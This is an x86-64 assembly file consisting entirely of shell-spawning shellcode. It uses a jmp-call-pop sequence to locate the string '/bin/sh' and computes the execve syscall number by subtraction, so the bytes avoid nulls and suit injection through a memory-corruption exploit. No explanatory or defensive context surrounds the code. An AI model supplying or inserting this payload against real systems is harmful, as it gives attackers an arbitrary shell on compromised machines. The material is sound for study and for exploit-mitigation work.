.section .text
.global _start

_start:
	jmp shellstr

code:
	pop %rdi
	xor %rsi, %rsi
	xor %rdx, %rdx
	mov $0x1111114C, %rax
	sub $0x11111111, %rax
	syscall

shellstr:
	call code
	.ascii "/bin/sh"
